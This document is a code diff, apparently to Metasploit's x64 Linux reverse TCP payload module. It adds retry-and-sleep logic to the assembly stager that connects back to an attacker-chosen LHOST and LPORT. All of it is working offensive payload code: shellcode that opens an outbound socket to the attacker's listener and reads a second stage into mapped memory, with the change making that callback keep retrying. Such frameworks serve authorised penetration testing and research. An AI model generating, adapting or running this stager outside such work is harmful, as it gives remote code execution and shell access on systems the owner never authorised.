@@ -27,13 +27,12 @@ module Payload::Linux::ReverseTcp
       port:        datastore['LPORT'],
       host:        datastore['LHOST'],
       retry_count: datastore['ReverseConnectRetries'],
-      reliable:    false
+      sleep_seconds: datastore['StagerRetryWait'],
     }
 
     # Generate the advanced stager if we have space
     if self.available_space && required_space <= self.available_space
       conf[:exitfunk] = datastore['EXITFUNC']
-      conf[:reliable] = true
     end
 
     generate_reverse_tcp(conf)
@@ -83,12 +82,16 @@ module Payload::Linux::ReverseTcp
   #
   def asm_reverse_tcp(opts={})
     # TODO: reliability is coming
-    retry_count  = [opts[:retry_count].to_i, 1].max
+    retry_count  = opts[:retry_count]
     reliable     = opts[:reliable]
     encoded_port = "%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
     encoded_host = "%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
+    seconds = (opts[:sleep_seconds] || 5.0)
+    sleep_seconds = seconds.to_i
+    sleep_nanoseconds = (seconds % 1 * 1000000000).to_i
 
     asm = %Q^
+      mmap:
         xor    rdi, rdi
         push   0x9
         pop    rax
@@ -103,6 +106,10 @@ module Payload::Linux::ReverseTcp
         test   rax, rax
         js failed
 
+        push   #{retry_count}        ; retry counter
+        pop    r9
+
+      create_socket:
         push   rsi
         push   rax
         push   0x29
@@ -116,6 +123,7 @@ module Payload::Linux::ReverseTcp
         test   rax, rax
         js failed
 
+      connect:
         xchg   rdi, rax
         mov    rcx, 0x#{encoded_host}#{encoded_port}
         push   rcx
@@ -126,8 +134,23 @@ module Payload::Linux::ReverseTcp
         pop    rax
         syscall ; connect(3, {sa_family=AF_INET, LPORT, LHOST, 16)
         test   rax, rax
-        js     failed
+        jns    recv
 
+      handle_failure:
+        dec    r9
+        jz     failed
+        push   0x23
+        pop    rax
+        push   0x#{sleep_nanoseconds.to_s(16)}
+        push   0x#{sleep_seconds.to_s(16)}
+        mov    rdi, rsp
+        xor    rsi, rsi
+        syscall                      ; sys_nanosleep
+        test   rax, rax
+        jns    create_socket
+        jmp    failed
+
+      recv:
         pop    rcx
         pop    rsi
         pop    rdx
